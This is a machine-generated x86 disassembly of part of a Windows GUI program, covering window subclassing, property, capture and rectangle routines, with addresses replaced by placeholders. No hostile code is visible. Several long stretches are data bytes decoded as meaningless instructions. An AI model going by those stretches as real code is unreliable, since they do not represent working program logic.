pop ebx
retn
mov edx esp
mov eax esi
call sub_431c68
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_431ce0
sub_431ce0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_431740
call GetTickCount
mov ebx eax
push 0x0
call sub_4060bc
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_431340
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431d64
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431d6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403540
call sub_4055c0
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_431db4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_431de0
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431e55
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4055a8
mov eax rw-data
call sub_4055a8
mov eax rw-data
call sub_4055a8
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_4055a8
mov eax [ rw-data ]
call sub_431410
sub_431e58
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431eb1
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_431d6c
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4055a8
mov edx eax
mov eax [ rw-data ]
call sub_422b20
sub_432094
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] ah
inc ebx
add [ eax ] al
add [ eax ] al
int3
sub_43358b
rcl [ eax + 0xf004335 ] 0xc
dec ecx
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x6793ffbf ] al
inc ebx
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] cl
fadd [ ebx ]
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ edi + ebp * 4 ] dh
inc ebx
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x722c0043 ] dh
inc ebx
add [ eax + 0x75 ] al
inc ebx
add ah ch
jae r-xdata
add [ eax ] al
add [ eax ] al
aam 0x36
inc ebx
add [ eax + 0x39 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
inc ebx
add [ esi + 0x39 ] ah
inc ebx
add [ edx + eax ] al
add [ eax ] al
fsubr [ esi ]
inc ebx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ eax - 0x33ffbc4a ] bh
xor [ eax ] eax
call 0xffffffff9043763a
cdq
inc ebx
add [ eax - 0x1a ] bl
inc ebx
add [ eax - 0x1bffbc52 ] al
cmp eax 0x94140041
inc ebx
add [ eax ] ch
push 0x9b340043
inc ebx
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add bh bh
dec [ esi + esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
inc ebx
add [ ecx + edi * 4 ] ah
inc ebx
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add al al
fiadd [ ebx ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + esi + 0x17c0043 ] cl
add [ eax ] al
pop esp
xor al 0x43
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
inc ebx
add [ ebp + esi * 4 + 0x43 ] dl
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ ebx + ebx * 4 - 0x5dbfffbd ] ch
inc ebx
add al ah
scasd [ edi ]
inc ebx
add ah cl
test eax 0xacc80043
inc ebx
add al bh
stosb [ edi ]
sub_4337b8
mov eax 0xb6ffb7ff
push [ ebp - 0x2f004b01 ]
mov esp 0xbe300043
inc ebx
add [ eax - 0x42 ] dl
inc ebx
add [ esi + edi * 4 + 0x43 ] dh
add ah al
mov esi 0xbee40043
inc ebx
add [ edi + edi * 4 ] al
inc ebx
add [ eax ] ch
mov edi 0xbf4c0043
inc ebx
add [ eax - 0x41 ] dh
inc ebx
add [ edi + edi * 4 - 0x3fe3ffbd ] dl
inc ebx
add ah bl
rol [ ebx ] 0x2c
rol [ ebx ] 0x60
rol [ ebx ] 0x74
rol [ ebx ] 0xfc
leave
inc ebx
add [ eax ] ch
0x43
sub_433e88
push 0x7200433e
inc ebx
add [ esi + edi + 0x43 ] bh
add ch ch
cmp eax 0x3df50043
inc ebx
add ch bh
cmp eax 0x3e050043
inc ebx
add [ edx ] dl
inc ebx
add [ edi ] bl
inc ebx
add [ esi + edi ] ch
inc ebx
add [ ecx ] bh
inc ebx
add [ esi + 0x3e ] al
inc ebx
add [ ebx + 0x3e ] dl
inc ebx
add [ eax + 0x3e ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x3e88e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + edi ] ch
inc ebx
add al al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3f ] bl
inc ebx
add [ eax ] bh
add [ eax ] al
xchg esp eax
adc [ eax ] eax
xor al 0x40
add [ eax ] ch
push esi
inc eax
add [ esi + edx * 2 ] dh
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ esi + edx * 2 + 0x40 ] al
add al ch
xor [ eax ] eax
add [ ecx ] al
inc esp
add [ ecx + eax + 0x44 ] dl
add ah cl
add al [ eax + eax - 0x24 ]
add al [ eax + eax - 0x64 ]
or al [ eax + eax - 0x7c ]
or eax 0xfc40044
inc esp
add al cl
adc [ eax + eax - 0x34 ] eax
push ss
inc esp
add [ eax - 0x67ffbbec ] al
inc [ ebx ]
pushad
push cs
inc esp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
or al 0x41
mov eax eax
mov al 0x3f
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2800433f ] dh
add [ eax ] al
add [ eax + 0x64004010 ] ah
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffb4437fde
and eax [ eax + eax + 0x6 ]
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ edi + ebp * 4 ] dh
inc ebx
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x722c0043 ] dh
inc ebx
add [ eax + 0x75 ] al
inc ebx
add ah ch
jae r-xdata
inc ecx
add [ ecx + ebx * 4 - 0x6793ffbf ] al
inc ebx
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] cl
fadd [ ebx ]
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
xchg esi eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc eax
inc ebx
add [ eax ] cl
add al [ eax ]
add al al
xor eax 0x99640043
inc ecx
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ eax - 0x33ffbc4a ] bh
xor [ eax ] eax
call 0xffffffff90438032
cdq
inc ebx
add [ eax - 0x1a ] bl
inc ebx
add [ eax - 0x1bffbc52 ] al
cmp eax 0x94140041
inc ebx
add [ eax ] ch
push 0x9b340043
inc ebx
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
nop
add al 0x40
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 ] cl
add [ eax + 0x6a ] dl
cld
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
je r-xdata
add [ ecx + edi * 4 ] ah
inc ebx
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add al al
fiadd [ ebx ]
push 0x6800402a
sub al [ eax ]
push 0x6800402a
sub al [ eax ]
push 0x6800402a
sub al [ eax ]
push 0x6800402a
sub al [ eax ]
les ebp [ edx ]
inc esp
add [ eax + 0x2a ] ch
inc eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
inc ebx
add [ ebp + esi * 4 + 0x43 ] dl
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ ebx + ebx * 4 - 0x5dbfffbd ] ch
inc ebx
add al ah
scasd [ edi ]
inc ebx
add ah cl
test eax 0xacc80043
inc ebx
add al bh
stosb [ edi ]
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
add [ eax ] eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
insb
nop
or al 0x41
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax + 0x74 ] al
push ds
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ebp
or [ eax - 0x18 ] dl
fisub [ ebx ]
std
inc [ ebp - 0x74f08a40 ]
inc ebp
or [ eax + 0x6a ] dl
hlt
insb
add al 0x40
inc ebx
add [ ecx + edi + 0x43 ] dh
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
or [ eax - 0x18 ] dl
stosd [ edi ]
and eax 0xfca1fffd
cli
inc ebp
add [ eax + 0xf ] dl
mov bh 0x5
push ds
sbb eax [ esi ]
outsd
insb
jae r-xdata
add [ ebp + 0x108a0040 ] cl
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43414c
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_434204
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_434238
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_434204
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_434294
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_434478
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40bf7c
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_40448c
mov eax edi
mov edx esi
call sub_403fc0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4344bc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40bf7c
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_40448c
mov eax edi
mov edx esi
call sub_403fc0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434528
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov eax ebx
call sub_43db40
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_4345d4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413840
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_434608
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db40
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_434630
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_434608
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_4345d4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4136e4
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4138bc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43468c
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413718
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413840
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_4346c0
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_413840
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_4345d4
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_434724
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_434784
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403184
mov edx esp
mov eax esi
call sub_4041d0
add esp 0x100
pop esi
pop ebx
retn
sub_4347c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43488a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_4358e0
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_435268
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406850
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_435268
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_4358e0
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_435268
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_4358e0
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43488f
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_4358e0
sub_4348e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434912
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434978
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434724
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_4349a4
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403430
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_4349d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403430
xor edx edx
sub_434a28
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43f744
sub_434a48
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43f72c
sub_434a6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_434954
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c85c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4219a0
mov edx eax
mov eax esi
call sub_41c9d8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_434ad0
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_434b00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434978
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_434b5c
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403430
pop edi
pop esi
pop ebp
retn 0x4
sub_434b80
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_434ba4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_434b80
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_434b80
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_434c60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
